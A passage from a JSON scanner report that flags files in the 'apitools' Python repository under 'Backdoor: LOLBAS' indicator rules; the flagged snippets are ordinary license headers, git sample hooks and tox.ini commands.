                    "text": "        schema['type'] = 'object'\n        schema['properties'] = collections.OrderedDict()\n        if 'parameterOrder' not in method_description:\n            ordered_parameters = list(method_description.get('parameters', []))\n        else:\n            ordered_parameters = method_description['parameterOrder'][:]\n            for k in method_description['parameters']:\n",
                    "rendered": {
                      "text": "        schema['type'] = 'object'\n        schema['properties'] = collections.OrderedDict()\n        if 'parameterOrder' not in method_description:\n            ordered_parameters = list(method_description.get('parameters', []))\n        else:\n            ordered_parameters = method_description['parameterOrder'][:]\n            for k in method_description['parameters']:\n",
                      "markdown": "`        schema['type'] = 'object'\n        schema['properties'] = collections.OrderedDict()\n        if 'parameterOrder' not in method_description:\n            ordered_parameters = list(method_description.get('parameters', []))\n        else:\n            ordered_parameters = method_description['parameterOrder'][:]\n            for k in method_description['parameters']:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/apitools/gen/client_generation_test.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 38,
                  "endLine": 7,
                  "snippet": {
                    "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 40,
                  "endLine": 122,
                  "endColumn": 48,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 122,
                  "startColumn": 11,
                  "endLine": 122,
                  "endColumn": 19,
                  "snippet": {
                    "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                    "rendered": {
                      "text": "\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n",
                      "markdown": "`\t\t;;\n\t*)\n\t\t# Anything else (is there anything else?)\n\t\techo \"*** Update hook: unknown type of update to ref $refname of type $newrev_type\" >&2\n\t\texit 1\n\t\t;;\nesac\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 39,
                  "endLine": 89,
                  "endColumn": 44,
                  "snippet": {
                    "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                    "rendered": {
                      "text": "\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n",
                      "markdown": "`\t\t;;\n\trefs/tags/*,tag)\n\t\t# annotated tag\n\t\tif [ \"$allowmodifytag\" != \"true\" ] && git rev-parse $refname > /dev/null 2>&1\n\t\tthen\n\t\t\techo \"*** Tag '$refname' already exists.\" >&2\n\t\t\techo \"*** Modifying a tag is not allowed in this repository.\" >&2\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 34,
                  "startColumn": 21,
                  "endLine": 34,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                    "rendered": {
                      "text": "\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n",
                      "markdown": "`\n# --- Safety check\nif [ -z \"$GIT_DIR\" ]; then\n\techo \"Don't run this script from the command line.\" >&2\n\techo \" (if you want, you could supply GIT_DIR then run\" >&2\n\techo \"  $0 <ref> <oldrev> <newrev>)\" >&2\n\texit 1\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/update.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to block unannotated tags from entering.\n# Called by \"git receive-pack\" with arguments: refname sha1-old sha1-new\n#\n# To enable this hook, rename this file to \"update\".\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/.git/hooks/pre-applypatch.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed\n# by applypatch from an e-mail message.\n#\n# The hook should exit with non-zero status after issuing an\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/tox.ini"
                },
                "region": {
                  "startLine": 22,
                  "startColumn": 3,
                  "endLine": 22,
                  "endColumn": 8,
                  "snippet": {
                    "text": "basepython =\n    python3.11\ncommands =\n    pip install six google-apitools\n    pycodestyle apitools\ndeps =\n    pycodestyle==2.4.0\n",
                    "rendered": {
                      "text": "basepython =\n    python3.11\ncommands =\n    pip install six google-apitools\n    pycodestyle apitools\ndeps =\n    pycodestyle==2.4.0\n",
                      "markdown": "`basepython =\n    python3.11\ncommands =\n    pip install six google-apitools\n    pycodestyle apitools\ndeps =\n    pycodestyle==2.4.0\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/apitools.zip/tox.ini"
                },
                "region": {
                  "startLine": 14,
                  "startColumn": 3,
                  "endLine": 14,
                  "endColumn": 8,
                  "snippet": {
                    "text": "    oauth2client3: oauth2client>=3,<=4dev\n    oauth2client4: oauth2client>=4,<=5dev\ncommands =\n    pip install google-apitools[testing]\n    nosetests []\npassenv = TRAVIS*\n\n",
                    "rendered": {
                      "text": "    oauth2client3: oauth2client>=3,<=4dev\n    oauth2client4: oauth2client>=4,<=5dev\ncommands =\n    pip install google-apitools[testing]\n    nosetests []\npassenv = TRAVIS*\n\n",
                      "markdown": "`    oauth2client3: oauth2client>=3,<=4dev\n    oauth2client4: oauth2client>=4,<=5dev\ncommands =\n    pip install google-apitools[testing]\n    nosetests []\npassenv = TRAVIS*\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        }
      ],
      "columnKind": "utf16CodeUnits"
    }
  ]
}